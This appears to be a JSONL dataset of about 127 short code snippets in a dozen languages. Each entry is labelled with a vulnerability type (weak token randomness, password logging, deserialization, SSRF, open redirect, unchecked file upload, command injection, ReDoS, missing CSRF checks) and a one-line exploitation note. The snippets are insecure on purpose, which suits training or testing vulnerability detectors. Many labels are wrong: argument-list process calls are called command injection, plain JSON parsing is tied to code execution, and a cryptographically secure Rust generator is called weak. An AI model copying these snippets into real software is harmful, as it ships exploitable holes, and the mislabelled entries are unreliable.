{"id": "vuln-751", "language": "Rust", "vulnerability_type": "Insecure File Permissions", "code_snippet": "fs::write(\"config.json\", config.to_string())?", "exploitation_techniques": "Access sensitive file contents.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-752", "language": "Elixir", "vulnerability_type": "Insecure File Permissions", "code_snippet": "File.write(\"config.json\", Jason.encode!(config))", "exploitation_techniques": "Read sensitive data from files.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-753", "language": "Perl", "vulnerability_type": "Insecure File Permissions", "code_snippet": "open(my $fh, '>', 'config.json'); print $fh encode_json($config);", "exploitation_techniques": "Access sensitive file contents.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-754", "language": "Node.js", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "const token = Math.random().toString(36).substring(2);", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-755", "language": "Python", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "token = ''.join(random.choices(string.ascii_letters, k=32))", "exploitation_techniques": "Predict random values due to weak PRNG.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-756", "language": "Java", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "String token = new Random().nextLong().toString();", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-757", "language": "PHP", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "$token = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 32);", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-758", "language": "Ruby", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "token = (0...32).map { ('a'..'z').to_a[rand(26)] }.join", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-759", "language": "Go", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "token := fmt.Sprintf(\"%x\", rand.Int63())", "exploitation_techniques": "Predict random values due to weak PRNG.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-760", "language": "C# (.NET)", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "var token = new Random().Next().ToString();", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-761", "language": "Kotlin", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "val token = Random().nextLong().toString()", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-762", "language": "Scala", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "val token = scala.util.Random.nextLong().toString", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-763", "language": "Rust", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "let token = thread_rng().gen::<u64>().to_string();", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-764", "language": "Elixir", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "token = :rand.uniform(1_000_000) |> to_string", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-765", "language": "Perl", "vulnerability_type": "Insecure Random Number Generation", "code_snippet": "my $token = join('', map { ('a'..'z')[rand 26] } 1..32);", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-766", "language": "Node.js", "vulnerability_type": "Insecure Logging", "code_snippet": "console.log(`User login: ${req.body.password}`);", "exploitation_techniques": "Extract sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-767", "language": "Python", "vulnerability_type": "Insecure Logging", "code_snippet": "logging.info(f'User login: {request.form['password']}')", "exploitation_techniques": "Access sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-768", "language": "Java", "vulnerability_type": "Insecure Logging", "code_snippet": "log.info(\"User login: \" + request.getParameter(\"password\"));", "exploitation_techniques": "Extract credentials from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-769", "language": "PHP", "vulnerability_type": "Insecure Logging", "code_snippet": "error_log('User login: ' . $_POST['password']);", "exploitation_techniques": "Access sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-770", "language": "Ruby", "vulnerability_type": "Insecure Logging", "code_snippet": "Rails.logger.info \"User login: #{params[:password]}\"", "exploitation_techniques": "Extract sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-771", "language": "Go", "vulnerability_type": "Insecure Logging", "code_snippet": "log.Printf(\"User login: %s\", r.FormValue(\"password\"))", "exploitation_techniques": "Access credentials from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-772", "language": "C# (.NET)", "vulnerability_type": "Insecure Logging", "code_snippet": "_logger.LogInformation($\"User login: {model.Password}\");", "exploitation_techniques": "Extract sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-773", "language": "Kotlin", "vulnerability_type": "Insecure Logging", "code_snippet": "logger.info(\"User login: ${call.request.queryParameters[\"password\"]}\")", "exploitation_techniques": "Access sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-774", "language": "Scala", "vulnerability_type": "Insecure Logging", "code_snippet": "logger.info(s\"User login: ${params(\"password\")}\")", "exploitation_techniques": "Extract sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-775", "language": "Rust", "vulnerability_type": "Insecure Logging", "code_snippet": "log::info!(\"User login: {}\", req.form::<Form>().await?.password);", "exploitation_techniques": "Access sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-776", "language": "Elixir", "vulnerability_type": "Insecure Logging", "code_snippet": "Logger.info(\"User login: #{params[\"password\"]}\")", "exploitation_techniques": "Extract sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-777", "language": "Perl", "vulnerability_type": "Insecure Logging", "code_snippet": "warn \"User login: \" . $r->param('password');", "exploitation_techniques": "Access sensitive data from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-778", "language": "Node.js", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "app.use(session({ secret: 'secret' }));", "exploitation_techniques": "Reuse old sessions indefinitely.", "cwe_category": "Session & Token Management"}
{"id": "vuln-779", "language": "Python", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "app.config['SESSION_PERMANENT'] = False", "exploitation_techniques": "Hijack sessions with no expiry.", "cwe_category": "Session & Token Management"}
{"id": "vuln-780", "language": "Java", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "HttpSession session = request.getSession();", "exploitation_techniques": "Reuse sessions indefinitely.", "cwe_category": "Session & Token Management"}
{"id": "vuln-781", "language": "PHP", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "session_start();", "exploitation_techniques": "Hijack sessions with no timeout.", "cwe_category": "Session & Token Management"}
{"id": "vuln-782", "language": "Ruby", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "use ActionDispatch::Session::CookieStore", "exploitation_techniques": "Reuse old sessions.", "cwe_category": "Session & Token Management"}
{"id": "vuln-783", "language": "Go", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "session := sessions.NewSession(store, \"session\")", "exploitation_techniques": "Hijack sessions with no expiry.", "cwe_category": "Session & Token Management"}
{"id": "vuln-784", "language": "C# (.NET)", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "services.AddSession();", "exploitation_techniques": "Reuse sessions indefinitely.", "cwe_category": "Session & Token Management"}
{"id": "vuln-785", "language": "Kotlin", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "install(Sessions) { cookie<UserSession>(\"session\") }", "exploitation_techniques": "Hijack sessions with no timeout.", "cwe_category": "Session & Token Management"}
{"id": "vuln-786", "language": "Scala", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "Ok.withSession(\"user\" -> user.id.toString)", "exploitation_techniques": "Reuse old sessions.", "cwe_category": "Session & Token Management"}
{"id": "vuln-787", "language": "Rust", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "router.get(\"/\", |req, res| req.session()?.set(\"user\", user))", "exploitation_techniques": "Hijack sessions with no expiry.", "cwe_category": "Session & Token Management"}
{"id": "vuln-788", "language": "Elixir", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "plug Plug.Session, store: :cookie, key: \"_session\"", "exploitation_techniques": "Reuse sessions indefinitely.", "cwe_category": "Session & Token Management"}
{"id": "vuln-789", "language": "Perl", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "$r->session->{user} = $user;", "exploitation_techniques": "Hijack sessions with no timeout.", "cwe_category": "Session & Token Management"}
{"id": "vuln-790", "language": "Node.js", "vulnerability_type": "Insecure Deserialization", "code_snippet": "const obj = JSON.parse(req.body.data);", "exploitation_techniques": "Inject malicious payloads to execute code.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-791", "language": "Python", "vulnerability_type": "Insecure Deserialization", "code_snippet": "obj = pickle.loads(request.data)", "exploitation_techniques": "Execute arbitrary code via malicious payloads.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-792", "language": "Java", "vulnerability_type": "Insecure Deserialization", "code_snippet": "ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); obj = ois.readObject();", "exploitation_techniques": "Inject malicious serialized objects.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-793", "language": "PHP", "vulnerability_type": "Insecure Deserialization", "code_snippet": "$obj = unserialize($_POST['data']);", "exploitation_techniques": "Execute arbitrary code via malicious input.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-794", "language": "Ruby", "vulnerability_type": "Insecure Deserialization", "code_snippet": "obj = Marshal.load(params[:data])", "exploitation_techniques": "Inject malicious payloads for code execution.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-795", "language": "Go", "vulnerability_type": "Insecure Deserialization", "code_snippet": "var obj interface{}; json.NewDecoder(r.Body).Decode(&obj)", "exploitation_techniques": "Inject malicious JSON payloads.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-796", "language": "C# (.NET)", "vulnerability_type": "Insecure Deserialization", "code_snippet": "var obj = JsonSerializer.Deserialize<object>(request.Body);", "exploitation_techniques": "Inject malicious payloads.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-797", "language": "Kotlin", "vulnerability_type": "Insecure Deserialization", "code_snippet": "val obj = Json.decodeFromString<Any>(call.receiveText())", "exploitation_techniques": "Inject malicious JSON payloads.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-798", "language": "Scala", "vulnerability_type": "Insecure Deserialization", "code_snippet": "val obj = Json.parse(request.body.asText)", "exploitation_techniques": "Inject malicious payloads.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-799", "language": "Rust", "vulnerability_type": "Insecure Deserialization", "code_snippet": "let obj: serde_json::Value = serde_json::from_reader(req.body()?)?;", "exploitation_techniques": "Inject malicious JSON payloads.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-800", "language": "Elixir", "vulnerability_type": "Insecure Deserialization", "code_snippet": "{:ok, obj} = Jason.decode(params[\"data\"])", "exploitation_techniques": "Inject malicious payloads.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-801", "language": "Perl", "vulnerability_type": "Insecure Deserialization", "code_snippet": "my $obj = Storable::thaw($r->param('data'));", "exploitation_techniques": "Inject malicious payloads for code execution.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-802", "language": "Node.js", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "const response = await axios.get(req.query.url);", "exploitation_techniques": "Access internal services or localhost endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-803", "language": "Python", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "response = requests.get(request.args.get('url'))", "exploitation_techniques": "Request internal or restricted endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-804", "language": "Java", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "URL url = new URL(request.getParameter(\"url\")); HttpURLConnection conn = url.openConnection();", "exploitation_techniques": "Access internal network resources.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-805", "language": "PHP", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "$response = file_get_contents($_GET['url']);", "exploitation_techniques": "Access internal or sensitive endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-806", "language": "Ruby", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "response = Net::HTTP.get(URI(params[:url]))", "exploitation_techniques": "Access internal services or localhost.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-807", "language": "Go", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "resp, _ := http.Get(r.URL.Query().Get(\"url\"))", "exploitation_techniques": "Request internal or restricted endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-808", "language": "C# (.NET)", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "var response = await httpClient.GetAsync(request.Query[\"url\"]);", "exploitation_techniques": "Access internal network resources.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-809", "language": "Kotlin", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "val response = http.get(call.parameters[\"url\"]!!)", "exploitation_techniques": "Access internal or sensitive endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-810", "language": "Scala", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "val response = WS.url(params(\"url\")).get()", "exploitation_techniques": "Access internal services or localhost.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-811", "language": "Rust", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "let resp = reqwest::get(req.param(\"url\")?).await?;", "exploitation_techniques": "Request internal or restricted endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-812", "language": "Elixir", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "{:ok, response} = HTTPoison.get(params[\"url\"])", "exploitation_techniques": "Access internal services or localhost.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-813", "language": "Perl", "vulnerability_type": "Server-Side Request Forgery (SSRF)", "code_snippet": "my $response = LWP::UserAgent->new->get($r->param('url'));", "exploitation_techniques": "Access internal or sensitive endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-814", "language": "Node.js", "vulnerability_type": "Insecure Redirects", "code_snippet": "res.redirect(req.query.redirect);", "exploitation_techniques": "Redirect users to malicious sites.", "cwe_category": "Access & Authorization"}
{"id": "vuln-815", "language": "Python", "vulnerability_type": "Insecure Redirects", "code_snippet": "return redirect(request.args.get('redirect'))", "exploitation_techniques": "Redirect to phishing or malicious sites.", "cwe_category": "Access & Authorization"}
{"id": "vuln-816", "language": "Java", "vulnerability_type": "Insecure Redirects", "code_snippet": "response.sendRedirect(request.getParameter(\"redirect\"));", "exploitation_techniques": "Redirect users to malicious domains.", "cwe_category": "Access & Authorization"}
{"id": "vuln-817", "language": "PHP", "vulnerability_type": "Insecure Redirects", "code_snippet": "header('Location: ' . $_GET['redirect']);", "exploitation_techniques": "Redirect to malicious sites.", "cwe_category": "Access & Authorization"}
{"id": "vuln-818", "language": "Ruby", "vulnerability_type": "Insecure Redirects", "code_snippet": "redirect_to params[:redirect]", "exploitation_techniques": "Redirect users to phishing sites.", "cwe_category": "Access & Authorization"}
{"id": "vuln-819", "language": "Go", "vulnerability_type": "Insecure Redirects", "code_snippet": "http.Redirect(w, r, r.URL.Query().Get(\"redirect\"), http.StatusFound)", "exploitation_techniques": "Redirect to malicious domains.", "cwe_category": "Access & Authorization"}
{"id": "vuln-820", "language": "C# (.NET)", "vulnerability_type": "Insecure Redirects", "code_snippet": "return Redirect(Request.Query[\"redirect\"]);", "exploitation_techniques": "Redirect users to malicious sites.", "cwe_category": "Access & Authorization"}
{"id": "vuln-821", "language": "Kotlin", "vulnerability_type": "Insecure Redirects", "code_snippet": "call.respond(redirect(call.parameters[\"redirect\"]!!))", "exploitation_techniques": "Redirect to phishing sites.", "cwe_category": "Access & Authorization"}
{"id": "vuln-822", "language": "Scala", "vulnerability_type": "Insecure Redirects", "code_snippet": "Redirect(params(\"redirect\"))", "exploitation_techniques": "Redirect users to malicious domains.", "cwe_category": "Access & Authorization"}
{"id": "vuln-823", "language": "Rust", "vulnerability_type": "Insecure Redirects", "code_snippet": "res.redirect(req.param(\"redirect\")?)", "exploitation_techniques": "Redirect to malicious sites.", "cwe_category": "Access & Authorization"}
{"id": "vuln-824", "language": "Elixir", "vulnerability_type": "Insecure Redirects", "code_snippet": "redirect conn, external: params[\"redirect\"]", "exploitation_techniques": "Redirect users to phishing sites.", "cwe_category": "Access & Authorization"}
{"id": "vuln-825", "language": "Perl", "vulnerability_type": "Insecure Redirects", "code_snippet": "$r->headers_out->set('Location' => $r->param('redirect'));", "exploitation_techniques": "Redirect to malicious domains.", "cwe_category": "Access & Authorization"}
{"id": "vuln-826", "language": "Node.js", "vulnerability_type": "Insecure File Upload", "code_snippet": "app.post('/upload', (req, res) => { req.files.file.mv('/uploads/' + req.files.file.name); });", "exploitation_techniques": "Upload malicious files like webshells.", "cwe_category": "Access & Authorization"}
{"id": "vuln-827", "language": "Python", "vulnerability_type": "Insecure File Upload", "code_snippet": "file = request.files['file']; file.save('uploads/' + file.filename)", "exploitation_techniques": "Upload executable scripts or malware.", "cwe_category": "Access & Authorization"}
{"id": "vuln-828", "language": "Java", "vulnerability_type": "Insecure File Upload", "code_snippet": "MultipartFile file = request.getFile(\"file\"); file.transferTo(new File(\"uploads/\" + file.getOriginalFilename()));", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-829", "language": "PHP", "vulnerability_type": "Insecure File Upload", "code_snippet": "move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);", "exploitation_techniques": "Upload executable scripts or webshells.", "cwe_category": "Access & Authorization"}
{"id": "vuln-830", "language": "Ruby", "vulnerability_type": "Insecure File Upload", "code_snippet": "File.write(\"uploads/#{params[:file].original_filename}\", params[:file].read)", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-831", "language": "Go", "vulnerability_type": "Insecure File Upload", "code_snippet": "file, header, _ := r.FormFile(\"file\"); os.WriteFile(\"uploads/\"+header.Filename, file, 0644)", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-832", "language": "C# (.NET)", "vulnerability_type": "Insecure File Upload", "code_snippet": "var file = Request.Form.Files[0]; await File.WriteAllBytesAsync(\"uploads/\" + file.FileName, file.OpenReadStream());", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-833", "language": "Kotlin", "vulnerability_type": "Insecure File Upload", "code_snippet": "val file = call.receiveMultipart().readPart() as FilePart; File(\"uploads/${file.fileName}\").writeBytes(file.streamProvider().readAllBytes())", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-834", "language": "Scala", "vulnerability_type": "Insecure File Upload", "code_snippet": "val file = request.body.asMultipartFormData.get.file(\"file\").get; Files.write(Paths.get(\"uploads/\" + file.filename), file.ref)", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-835", "language": "Rust", "vulnerability_type": "Insecure File Upload", "code_snippet": "let part = req.multipart()?.next_field()?.await?; fs::write(format!(\"uploads/{}\", part.file_name()?), part.bytes()?.await?)?;", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-836", "language": "Elixir", "vulnerability_type": "Insecure File Upload", "code_snippet": "file = params[\"file\"]; File.write(\"uploads/#{file.filename}\", file.content)", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-837", "language": "Perl", "vulnerability_type": "Insecure File Upload", "code_snippet": "my $file = $r->upload('file'); open(my $fh, '>', \"uploads/$file->{filename}\"); print $fh $file->{content};", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-838", "language": "Node.js", "vulnerability_type": "Command Injection", "code_snippet": "exec(`cat ${req.query.file}`);", "exploitation_techniques": "Inject malicious commands via input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-839", "language": "Python", "vulnerability_type": "Command Injection", "code_snippet": "os.system(f'cat {request.args.get(\"file\")}')", "exploitation_techniques": "Inject arbitrary commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-840", "language": "Java", "vulnerability_type": "Command Injection", "code_snippet": "Runtime.getRuntime().exec(\"cat \" + request.getParameter(\"file\"));", "exploitation_techniques": "Inject malicious commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-841", "language": "PHP", "vulnerability_type": "Command Injection", "code_snippet": "shell_exec('cat ' . $_GET['file']);", "exploitation_techniques": "Inject arbitrary commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-842", "language": "Ruby", "vulnerability_type": "Command Injection", "code_snippet": "system(\"cat #{params[:file]}\")", "exploitation_techniques": "Inject malicious commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-843", "language": "Go", "vulnerability_type": "Command Injection", "code_snippet": "exec.Command(\"cat\", r.URL.Query().Get(\"file\")).Run()", "exploitation_techniques": "Inject arbitrary commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-844", "language": "C# (.NET)", "vulnerability_type": "Command Injection", "code_snippet": "Process.Start(\"cmd.exe\", \"/c cat \" + Request.Query[\"file\"]);", "exploitation_techniques": "Inject malicious commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-845", "language": "Kotlin", "vulnerability_type": "Command Injection", "code_snippet": "ProcessBuilder(\"cat\", call.parameters[\"file\"]!!).start()", "exploitation_techniques": "Inject arbitrary commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-846", "language": "Scala", "vulnerability_type": "Command Injection", "code_snippet": "import sys.process._; s\"cat ${params(\"file\")}\".!", "exploitation_techniques": "Inject malicious commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-847", "language": "Rust", "vulnerability_type": "Command Injection", "code_snippet": "Command::new(\"cat\").arg(req.param(\"file\")?).output()?", "exploitation_techniques": "Inject arbitrary commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-848", "language": "Elixir", "vulnerability_type": "Command Injection", "code_snippet": "System.cmd(\"cat\", [params[\"file\"]])", "exploitation_techniques": "Inject malicious commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-849", "language": "Perl", "vulnerability_type": "Command Injection", "code_snippet": "system(\"cat \" . $r->param('file'));", "exploitation_techniques": "Inject arbitrary commands.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-850", "language": "Node.js", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "const re = /^((a+)+)$/; re.test(req.query.input);", "exploitation_techniques": "Craft input to cause exponential backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-851", "language": "Python", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "import re; re.match(r'^((a+)+)$', request.args.get('input'))", "exploitation_techniques": "Trigger ReDoS with malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-852", "language": "Java", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "Pattern.compile(\"^((a+)+)$\").matcher(request.getParameter(\"input\")).matches();", "exploitation_techniques": "Cause denial of service via backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-853", "language": "PHP", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "preg_match('/^((a+)+)$/', $_GET['input']);", "exploitation_techniques": "Trigger exponential backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-854", "language": "Ruby", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "/^((a+)+)$/.match?(params[:input])", "exploitation_techniques": "Cause ReDoS with crafted input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-855", "language": "Go", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "re := regexp.MustCompile(`^((a+)+)$`); re.MatchString(r.URL.Query().Get(\"input\"))", "exploitation_techniques": "Trigger denial of service via backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-856", "language": "C# (.NET)", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "Regex.IsMatch(Request.Query[\"input\"], \"^((a+)+)$\");", "exploitation_techniques": "Cause ReDoS with malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-857", "language": "Kotlin", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "Regex(\"^((a+)+)$\").matches(call.parameters[\"input\"]!!)", "exploitation_techniques": "Trigger exponential backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-858", "language": "Scala", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "val re = \"^((a+)+)$\".r; re.findFirstIn(params(\"input\")).isDefined", "exploitation_techniques": "Cause ReDoS with crafted input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-860", "language": "Elixir", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "Regex.match?(~r/^((a+)+)$/, params[\"input\"])", "exploitation_techniques": "Cause ReDoS with malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-861", "language": "Perl", "vulnerability_type": "Insecure Regular Expression", "code_snippet": "my $input = $r->param('input'); $input =~ /^((a+)+)$/;", "exploitation_techniques": "Trigger exponential backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-862", "language": "Node.js", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "app.get('/', (req, res) => res.send('Home'));", "exploitation_techniques": "Enable clickjacking attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-863", "language": "Python", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "@app.route('/') def home(): return 'Home'", "exploitation_techniques": "Facilitate clickjacking.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-864", "language": "Java", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "@GetMapping(\"/\") public String home() { return \"Home\"; }", "exploitation_techniques": "Enable clickjacking or other attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-865", "language": "PHP", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "echo 'Home';", "exploitation_techniques": "Facilitate clickjacking attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-866", "language": "Ruby", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "get '/' do 'Home' end", "exploitation_techniques": "Enable clickjacking.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-867", "language": "Go", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, \"Home\") })", "exploitation_techniques": "Facilitate clickjacking attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-868", "language": "C# (.NET)", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "[HttpGet(\"/\")] public IActionResult Home() { return Ok(\"Home\"); }", "exploitation_techniques": "Enable clickjacking.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-869", "language": "Kotlin", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "get(\"/\") { call.respondText(\"Home\") }", "exploitation_techniques": "Facilitate clickjacking attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-870", "language": "Scala", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "get(\"/\") { Ok(\"Home\") }", "exploitation_techniques": "Enable clickjacking.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-871", "language": "Rust", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "router.get(\"/\", |_, res| res.render_text(\"Home\"))", "exploitation_techniques": "Facilitate clickjacking attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-872", "language": "Elixir", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "get \"/\", do: send_resp(conn, 200, \"Home\")", "exploitation_techniques": "Enable clickjacking.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-873", "language": "Perl", "vulnerability_type": "Insecure HTTP Headers", "code_snippet": "$r->print('Home');", "exploitation_techniques": "Facilitate clickjacking attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-874", "language": "Node.js", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "app.post('/update', (req, res) => updateUser(req.body));", "exploitation_techniques": "Forge requests to perform unauthorized actions.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-875", "language": "Python", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "@app.route('/update', methods=['POST']) def update(): update_user(request.form)", "exploitation_techniques": "Execute unauthorized actions via forged requests.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-876", "language": "Java", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "@PostMapping(\"/update\") public void update(@RequestBody User user) { userRepo.save(user); }", "exploitation_techniques": "Forge requests to modify data.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-877", "language": "PHP", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "$user = $_POST; update_user($user);", "exploitation_techniques": "Perform unauthorized actions via forged requests.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-878", "language": "Ruby", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "post '/update' do update_user(params) end", "exploitation_techniques": "Forge requests to change data.", "cwe_category": "Server/Client Request Forgery"}
